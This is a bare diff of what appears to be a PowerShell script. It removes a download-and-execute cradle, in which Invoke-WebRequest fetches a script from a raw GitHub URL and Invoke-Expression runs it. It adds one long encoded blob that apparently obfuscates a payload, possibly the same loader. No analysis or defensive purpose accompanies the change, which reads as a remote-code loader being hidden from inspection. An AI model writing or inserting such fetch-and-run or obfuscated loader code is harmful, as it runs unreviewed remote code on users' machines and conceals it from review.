@@ -1,3 +1,1 @@
-$a = "hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh"
-$scriptContent = Invoke-WebRequest -uri "https://raw.githubusercontent.com/43a1723/test/main/download.ps1" -UseBasicParsing
-Invoke-Expression $scriptContent.Content
+VwRDT0VWAw0RGw0LGg0cAw0RGw0LGg0cAw0RGw0LGg0cAw0RGw0LGg0cAw0RUW9HAQYGAhUNMAoNBgAaH0VEUywNBAofDkguFgcxFxQBDhYNU0gWAAxUSQ0NBxUQSEpbGQQOXQIKBg0BCRAKFhcAHQsADgsNXQYMH0pAWARIRFdQXRERGBFWHgQKHEoQBBIXHwoCFksEGFRbU0g2AQA2ChYQEDUCABYdBQJzOgsVHQ4RRiABAxcGARYdBAtZVxYAAAwEHyYWHREGHBFaKAoXBwANBm8=
